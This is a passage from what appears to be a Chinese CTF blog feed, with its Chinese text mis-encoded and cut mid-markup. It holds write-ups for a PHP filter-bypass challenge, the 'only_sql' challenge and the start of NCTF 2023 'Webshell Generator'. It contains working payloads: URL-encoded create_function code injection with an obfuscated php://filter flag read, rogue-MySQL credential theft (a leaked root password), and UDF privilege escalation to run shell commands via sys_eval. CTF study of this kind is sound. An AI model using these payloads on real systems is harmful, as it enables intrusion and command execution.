<span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ¶‰åŠåˆ°ä¸€ä¸ªå°tirckï¼š<br>$_REQUESTåœ¨åŒæ—¶æ¥å—POSTå’ŒGETå‚æ•°æ—¶ï¼ŒPOSTä¼˜å…ˆçº§é«˜</p>
<h3 id="4"><a href="#4" class="headerlink" title="4"></a>4</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'debu_debu_aqua'</span><span class="token punctuation">)</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Aqua is the cutest five-year-old child in the world! Isn't it ?&lt;br>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>ä¹Ÿå°±æ˜¯fileä¼ å…¥çš„å‚æ•°ç­‰äº<strong>debu_debu_aqua</strong>ï¼Œè¿™é‡Œè¦ç»•è¿‡file_get_contentså‡½æ•°ä½¿ç”¨dataä¼ªåè®®<code>file=data://text/plain,debu_debu_aqua</code></p>
<h3 id="5"><a href="#5" class="headerlink" title="5"></a>5</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$shana</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$passwd</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$shana</span> <span class="token operator">!=</span> <span class="token variable">$passwd</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token function">extract</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"flag"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//æ³¨æ„åˆ°è¿™é‡Œï¼Œåé¢ä¼šç”¨åˆ°</span>
    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Very good! you know my password. But what is flag?&lt;br>"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck you! you don't know my password! And you don't know sha1! why you come here!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>è¿™ä¸ªå°±æ˜¯ä½¿ç”¨æ•°ç»„ç»•è¿‡å°±è¡Œ<br>shana[]&#x3D;1&amp;passwd[]&#x3D;2</p>
<p>åˆ°è¿™é‡Œå°±è¿˜å‰©æœ€åä¸€å…³ï¼Œæ•´ç†ä¸€ä¸‹ä¸Šé¢çš„<br><code>debu=aqua_is_cute%0a</code><br><code>file=data://text/plain,debu_debu_aqua</code><br><code>shana[]=1&amp;passwd[]=2</code><br>é’ˆå¯¹äº<code>$_REQUESTåœ¨åŒæ—¶æ¥å—POSTå’ŒGETå‚æ•°æ—¶ï¼ŒPOSTä¼˜å…ˆçº§é«˜</code>ï¼Œåªéœ€å†ä¼ å…¥ä¸€ä¸ªPOSTçš„<code>debu</code>å’Œ<code>file</code>å€¼ä¸ºæ•°å­—å³å¯ã€‚<br><code>1nD3x.php?debu=aqua_is_cute%0a&amp;file=data://text/plain,debu_debu_aqua&amp;shana[]=1&amp;passwd[]=2</code><br>åœ¨è¿›è¡Œurlå…¨ç¼–ç å¯å¾—<br><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code><br>POST<code>file=1&amp;debu=2</code><br><img src="https://img-blog.csdnimg.cn/direct/f0da076569004a95af4254cd1d034c89.png" alt="123"></p>
<h3 id="6"><a href="#6" class="headerlink" title="6"></a>6</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/^[a-z0-9]*$/isD'</span><span class="token punctuation">,</span> <span class="token variable">$code</span><span class="token punctuation">)</span> <span class="token operator">||</span> 
<span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\"|\'|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i'</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"&lt;br />Neeeeee~! I have disabled all dangerous functions! You can't get my flag =w="</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
    <span class="token keyword">include</span> <span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">;</span>
    <span class="token variable">$code</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$arg</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>å¯æ§çš„æœ‰codeå’Œargï¼Œåœ¨<code>$code(&#39;&#39;, $arg)</code>å¯ä»¥ä½¿ç”¨creat_functionè¿›è¡Œæ³¨å…¥<br>ä¸Šé¢å‡ºç°çš„<code>extract($_GET[&quot;flag&quot;]);</code>åœ¨è¿™é‡Œå‘æŒ¥äº†ä½œç”¨</p>
<blockquote>
<p>extract()å‡½æ•°ç”¨äºä»æ•°ç»„ä¸­å°†å˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ã€‚æ¢å¥è¯è¯´ï¼Œå®ƒä¼šåˆ›å»ºæ–°çš„å˜é‡ï¼Œè¿™äº›å˜é‡çš„åç§°å’Œå€¼æ¥è‡ªäºä½ ä¼ é€’ç»™ extract() çš„æ•°ç»„ã€‚<br>å› æ­¤ï¼Œextract($_GET[â€œflagâ€]); è¿™è¡Œä»£ç çš„æ„å›¾æ˜¯ä» URL å‚æ•°ä¸­è·å–åä¸º â€œflagâ€ çš„å€¼ï¼Œå¹¶å°è¯•ä½¿ç”¨è¿™ä¸ªå€¼ä½œä¸ºå˜é‡åæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å˜é‡ï¼ŒåŒæ—¶è¿™ä¸ªæ–°å˜é‡çš„å€¼ä¹Ÿå°†æ˜¯ â€œflagâ€ å‚æ•°çš„å€¼ã€‚<br>ä¾‹å¦‚ï¼Œå¦‚æœ URL æ˜¯ <a href="http://example.com/?flag=testValue%EF%BC%8C%E9%82%A3%E4%B9%88%E6%89%A7%E8%A1%8C%E8%BF%99%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%90%8E%EF%BC%8C%E5%B0%86%E4%BC%9A%E6%9C%89%E4%B8%80%E4%B8%AA%E5%90%8D%E4%B8%BA">http://example.com/?flag=testValueï¼Œé‚£ä¹ˆæ‰§è¡Œè¿™è¡Œä»£ç åï¼Œå°†ä¼šæœ‰ä¸€ä¸ªåä¸º</a> $testValue çš„æ–°å˜é‡ï¼Œå…¶å€¼ä¸º â€œtestValueâ€ã€‚</p>
</blockquote>
<p>è¿™å°±å¥½ç†è§£äº†ï¼Œç°åœ¨ä¼ å…¥flag[code]ï¼Œflag[arg]ã€‚ä¹Ÿå°±æ˜¯å­˜åœ¨äº†GETä¼ å…¥çš„codeå’Œargå‚æ•°ã€‚<br>åœ¨åŸºäºè¦é…åˆ<code>create_function</code>è¿›è¡Œæ³¨å…¥ï¼š<br><code>flag[code]=create_function</code><br>è¿™æ—¶å°±æ˜¯<br><code>create_function(&#39;&#39;, $arg);</code><br>å°è¯•ä¼ å…¥argçš„å€¼è®©ä»£ç è¿›è¡Œé—­åˆ<br><code>flag[arg]=&#125;ä»£ç ï¼›//</code><br>è¿™é‡Œ}å°±é—­åˆäº†create_functionå‡½æ•°ä¹Ÿæ³¨é‡Šäº†åé¢çš„å†…å®¹<br>ç„¶åæ„é€ <code>flag[code]=create_function&amp;flag[arg]=&#125;var_dump(get_defined_vars());//</code><br>var_dump(get_defined_vars())ï¼šæ‰“å°å‡ºå½“å‰ä½œç”¨åŸŸå†…æ‰€æœ‰å·²å®šä¹‰å˜é‡çš„åç§°ã€ç±»å‹å’Œå€¼ã€‚<br>å†è¿›è¡Œå…¨ç¼–ç åå¯å¾—<br><code>1nD3x.php?%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2&amp;%66%6c%61%67%5b%63%6f%64%65%5d=%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d=&#125;%76%61%72%5f%64%75%6d%70(%67%65%74%5f%64%65%66%69%6e%65%64%5f%76%61%72%73());//</code><br><img src="https://img-blog.csdnimg.cn/direct/f67e05b827b8418b9bb0bb2d20765aed.png" alt="123"><br>ä½¿ç”¨requireè¯»å–flagæ–‡ä»¶<br><code>require(php://filter/read=convert.base64-encode/resource=rea1fl4g.php)</code><br>æ›¿æ¢<code>var_dump(get_defined_vars())</code>ç”±äºè¦è¿›è¡Œæ— å‚ä¼ å…¥ï¼Œè¿™é‡Œä½¿ç”¨<del>ç»•è¿‡æ­£åˆ™<br>&#96;require(</del>(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f))<code>æœ€åçš„payload</code>1nD3x.php?%64%65%62%75&#x3D;%61%71%75%61%5f%69%73%5f%63%75%74%65%0a&amp;file&#x3D;%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%73%68%61%6e%61[]&#x3D;1&amp;%70%61%73%73%77%64[]&#x3D;2&amp;%66%6c%61%67%5b%63%6f%64%65%5d&#x3D;%63%72%65%61%74%65%5f%66%75%6e%63%74%69%6f%6e&amp;%66%6c%61%67%5b%61%72%67%5d&#x3D;}require(~(%8f%97%8f%c5%d0%d0%99%96%93%8b%9a%8d%d0%8d%9a%9e%9b%c2%9c%90%91%89%9a%8d%8b%d1%9d%9e%8c%9a%c9%cb%d2%9a%91%9c%90%9b%9a%d0%8d%9a%8c%90%8a%8d%9c%9a%c2%8d%9a%9e%ce%99%93%cb%98%d1%8f%97%8f));&#x2F;&#x2F;&#96;<br><img src="https://img-blog.csdnimg.cn/direct/3a91063c328541b88119eae0f8a3d8ee.png" alt="465"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¬¬ä¸ƒå±Šè¥¿æ¹–è®ºå‰‘-web-only_sql</title>
    <url>/2024/01/31/%E7%AC%AC%E4%B8%83%E5%B1%8A%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91-web-only-sql/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="only-sql"><a href="#only-sql" class="headerlink" title="only_sql"></a>only_sql</h2><p>è¿™ä¸ªé¢˜åœ¨NNçš„companyä¸‹åšäº†å‡ºæ¥ğŸ˜Š<br>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªè¿æ¥æ•°æ®åº“çš„ç•Œé¢<br><img src="https://img-blog.csdnimg.cn/direct/7c175920fdaf4a6fa917d92017b06c12.png" alt="123"><br>é‚£ä¹ˆå¯ä»¥å…ˆä¼ªé€ ä¸€ä¸ªæ•°æ®åº“ï¼Œé‡‡ç”¨çš„é¡¹ç›®æ˜¯<a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue-Mysql-Server</a>ï¼Œå…·ä½“çœ‹å¯ä»¥å‚è€ƒæ–‡ç« <a href="https://blog.csdn.net/tomyyyyyy/article/details/119881486">ä¼ªé€ mysqlæœåŠ¡ç«¯</a><br>å°†é¡¹ç›®ä¸­çš„rogue_mysql_server.pyæ–‡ä»¶ä¿®æ”¹ä¸€ä¸‹<br><img src="https://img-blog.csdnimg.cn/direct/beba83f897c2484ba782cab1a8cb6820.png" alt="123"><br>æ”¾åœ¨vpsä¸Šè¿è¡Œ<br><img src="https://img-blog.csdnimg.cn/direct/2a3409ccf8a04985a1c1a4f906625036.png" alt="123"><br>ç„¶åæ‰§è¡Œä»»æ„è¯­å¥åæŸ¥çœ‹ç”Ÿæˆçš„æ—¥å¿—mysql.log<br><img src="https://img-blog.csdnimg.cn/direct/7af086addf264d6fa64a107d9207ced1.png" alt="123"></p>
<blockquote>
<p>127.0.0.1:3306<br>root<br>1q2w3e4r5t!@#<br>mysql</p>
</blockquote>
<p>è¿æ¥é¶æœºæ•°æ®åº“ï¼Œåé¢çœ‹çœ‹èƒ½ä¸èƒ½è¿›è¡Œæ•°æ®åº“ææƒï¼ˆUDFææƒï¼‰ï¼ŒæŸ¥çœ‹é¡¹ç›®<a href="https://github.com/SEC-GO/Red-vs-Blue/blob/master/linux%E7%8E%AF%E5%A2%83%E4%B8%8B%E7%9A%84MySQL%20UDF%E6%8F%90%E6%9D%83.md">linuxç¯å¢ƒä¸‹çš„MySQL UDFææƒ</a><br>æŒ‰ç…§ä¸Šé¢çš„è¯´æ˜è¿›è¡Œudfææƒ<br><img src="https://img-blog.csdnimg.cn/direct/26d82c9cba154c458e5a6d74ce68c435.png" alt="123"></p>
<p><img src="https://img-blog.csdnimg.cn/direct/d1c067ac9e77401898c0936997323213.png" alt="123"><br>å¯ä»¥è¿›è¡Œææƒ</p>
<h3 id="1ã€è·å–pluginè·¯å¾„"><a href="#1ã€è·å–pluginè·¯å¾„" class="headerlink" title="1ã€è·å–pluginè·¯å¾„"></a>1ã€è·å–pluginè·¯å¾„</h3><blockquote>
<p>show variables like â€œ%plugin%â€;<br><img src="https://img-blog.csdnimg.cn/direct/e4b8affacfbb4f4facf90e0cf1803859.png" alt="456"></p>
</blockquote>
<h3 id="2ã€è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯"><a href="#2ã€è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯" class="headerlink" title="2ã€è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯"></a>2ã€è·å–æœåŠ¡å™¨ç‰ˆæœ¬ä¿¡æ¯</h3><blockquote>
<p>show variables like â€˜version_compile_%â€™;<br><img src="https://img-blog.csdnimg.cn/direct/e1b913e4990e401f85094a60b0b13244.png" alt="123"></p>
</blockquote>
<h3 id="3ã€ä»sqlmapè·å–ç°æˆçš„udfæ–‡ä»¶"><a href="#3ã€ä»sqlmapè·å–ç°æˆçš„udfæ–‡ä»¶" class="headerlink" title="3ã€ä»sqlmapè·å–ç°æˆçš„udfæ–‡ä»¶"></a>3ã€ä»sqlmapè·å–ç°æˆçš„udfæ–‡ä»¶</h3><p>åˆ†åˆ«æ˜¯32ä½å’Œ64ä½çš„ï¼Œæˆ‘ä»¬é€‰æ‹©64ä½çš„ã€‚ï¼ˆmetasploité‡Œé¢ä¹Ÿæœ‰udfæ–‡ä»¶ï¼‰</p>
<h3 id="4ã€ä¸Šä¼ udfåº“æ–‡ä»¶"><a href="#4ã€ä¸Šä¼ udfåº“æ–‡ä»¶" class="headerlink" title="4ã€ä¸Šä¼ udfåº“æ–‡ä»¶"></a>4ã€ä¸Šä¼ udfåº“æ–‡ä»¶</h3><p>è·å–åº“æ–‡ä»¶çš„16è¿›åˆ¶ï¼ˆè¿™é‡Œæˆ‘çš„linuxä¸­æ²¡æœ‰å®‰è£…mysqlæœåŠ¡ï¼Œå› æ­¤æˆ‘æŠŠsoæ–‡ä»¶æ”¾åœ¨äº†windowsé‡Œé¢æ¥å¾—åˆ°çš„æ–‡ä»¶çš„16è¿›åˆ¶ï¼‰<br>å¼€å¯MySQLæœåŠ¡ç„¶åè·å–soæ–‡ä»¶çš„16è¿›åˆ¶</p>
<blockquote>
<p>select hex(load_file(â€˜C:\Users\86159\Desktop\lib_mysqludf_sys.soâ€™)) into outfile â€˜C:\Users\86159\Desktop\udf.txtâ€™;<br>æ³¨æ„è·¯å¾„è¦è¿›è¡ŒåŒæ–œæ </p>
<p><img src="https://img-blog.csdnimg.cn/direct/d2812023f9944fc2ac38c4d005f72690.png" alt="123"><br>æˆåŠŸå¾—åˆ°udf.txt<br>4.1ã€ä¸Šä¼ åº“æ–‡ä»¶<br>select unhex(â€˜7F454C46020101â€¦â€¦000â€™) into dumpfile â€˜&#x2F;usr&#x2F;lib&#x2F;mysql&#x2F;p1ugin&#x2F;mysqludf.soâ€™;<br><code>7F454C46020101......000</code>æ˜¯udf.txtæ–‡ä»¶å†…å®¹ï¼Œæ³¨æ„ä¸è¦æ¢è¡Œï¼ï¼<br>ä¸Šé¢è¿™ä¸ªå‘½ä»¤åœ¨é¶æœºçš„mysqläº¤äº’å‘½ä»¤è¡Œé‡Œæ‰§è¡Œ</p>
</blockquote>
<p>ç„¶åä¾æ¬¡æ‰§è¡Œ</p>
<blockquote>
<p>create function sys_eval returns string soname â€œmysqludf.soâ€;<br>select sys_eval(â€˜whoamiâ€™);ï¼ˆåˆ°è¿™é‡Œå°±å¯ä»¥å‘½ä»¤æ‰§è¡Œäº†ï¼‰</p>
</blockquote>
<p><img src="https://img-blog.csdnimg.cn/direct/86d5cfda97a24523bcefd3aff7e92e94.png" alt="123"><br>flagåœ¨ç¯å¢ƒå˜é‡é‡Œé¢æ‰§è¡Œenv</p>
<p><img src="https://img-blog.csdnimg.cn/direct/e006ffe2bcae4eabb24a8c75ed0097ef.png" alt="123"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>NCTF-2023-Webshell-Generator</title>
    <url>/2024/01/31/NCTF-2023-Webshell-Generator/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="NCTF-2023-Webshell-Generator"><a href="#NCTF-2023-Webshell-Generator" class="headerlink" title="[NCTF 2023]Webshell Generator"></a>[NCTF 2023]Webshell Generator</h2><p>ä»¥å‰çš„é¢˜ç›®äº†ï¼Œä»Šå¤©è¿‡æ¥å¤ç°ä¸€ä¸‹å§ã€‚ã€‚ã€‚<br>è¿™ä¸ªä¸»è¦è€ƒå¯Ÿsedå‘½ä»¤æ³¨å…¥ï¼Œå½“ç„¶è¿™ä¸ªé¢˜ç›®å®ƒå­˜åœ¨æ–‡ä»¶è¯»å–ï¼Œéš¾åº¦ç›¸å¯¹æ¥è¯´ä¹Ÿå¥½äº†ä¸€ç‚¹<br>æ‰“å¼€é¢˜ç›®é¡µé¢å¦‚ä¸‹ï¼š<br><img src="https://img-blog.csdnimg.cn/direct/135f4f194de849418962770eb0a2ec18.png" alt="123"></p>
<p>ç»è¿‡æµ‹è¯•å‘ç°å¯†é’¥æˆ‘ä»¬æ˜¯å¯æ§çš„ï¼Œè¿˜æœ‰ä¸€ç‚¹åœ¨ä½¿ç”¨bpçš„è¿‡ç¨‹ä¸­ï¼Œä¸‹è½½webshell.phpçš„å“åº”åŒ…å‡ºç°å¯ç–‘ç‚¹ã€‚</p>
<p><img src="https://img-blog.csdnimg.cn/direct/5cc52620e5fd4099afa1cca8953bfb9b.png" alt="123"></p>
<p>å°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è¯»å–æ–‡ä»¶ï¼Œå¾ˆç¡®å®šï¼Œå½“ç„¶å¯ä»¥ğŸ˜<br><img src="https://img-blog.csdnimg.cn/direct/dcd24a6978f44b74ae6a845138129fd7.png" alt="456"><br>å°†æ–‡ä»¶index,phpã€download.phpã€generate.shè¯»å–å‡ºæ¥å®¡è®¡<br>index.php</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token keyword">function</span> <span class="token function-definition function">security_validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/\r|\n/'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span> ä¸èƒ½åŒ…å«æ¢è¡Œç¬¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">114</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$key</span></span> ä¸èƒ½è¶…è¿‡114ä¸ªå­—ç¬¦ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token function">security_validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span>@<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> @<span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'language'</span><span class="token punctuation">]</span> <span class="token operator">!==</span> <span class="token string single-quoted-string">'PHP'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"PHPæ˜¯æœ€å¥½çš„è¯­è¨€"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'method'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$key</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'key'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"METHOD=<span class="token interpolation"><span class="token variable">$method</span></span>"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çš„methodå¤ªå¤æ‚äº†ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">putenv</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"KEY=<span class="token interpolation"><span class="token variable">$key</span></span>"</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ä½ çš„keyå¤ªå¤æ‚äº†ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$status_code</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"sh generate.sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ç”Ÿæˆå¤±è´¥äº†ï¼"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token function">trim</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Location: download.php?file=<span class="token interpolation"><span class="token variable">$filename</span></span>&amp;filename=<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>

<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>Webshellç”Ÿæˆå™¨<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">
        <span class="token selector">body</span> <span class="token punctuation">&#123;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #f2f2f2<span class="token punctuation">;</span>
            <span class="token property">font-family</span><span class="token punctuation">:</span> Arial<span class="token punctuation">,</span> sans-serif<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">form</span> <span class="token punctuation">&#123;</span>
            <span class="token property">margin</span><span class="token punctuation">:</span> 50px auto<span class="token punctuation">;</span>
            <span class="token property">width</span><span class="token punctuation">:</span> 400px<span class="token punctuation">;</span>
            <span class="token property">background-color</span><span class="token punctuation">:</span> #fff<span class="token punctuation">;</span>
            <span class="token property">padding</span><span class="token punctuation">:</span> 20px<span class="token punctuation">;</span>
            <span class="token property">border-radius</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
            <span class="token property">box-shadow</span><span class="token punctuation">:</span> 0px 0px 10px <span class="token function">rgba</span><span class="token punctuation">(</span>0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0<span class="token punctuation">,</span> 0.2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">h1</span> <span class="token punctuation">&#123;</span>
            <span class="token property">text-align</span><span class="token punctuation">:</span> center<span class="token punctuation">;</span>
            <span class="token property">color</span><span class="token punctuation">:</span> #333<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>

        <span class="token selector">label</span> <span class="token punctuation">&#123;</span>
            <span class="token property">display</span><span class="token punctuation">:</span> block<span class="token punctuation">;</span>
            <span class="token property">margin-bottom</span><span class="token punctuation">:</span> 10px<span class="token punctuation">;</span>
            <span class="token property">color</span><span class="token punctuation">:</span> #666<span class="token punctuation">;</span>
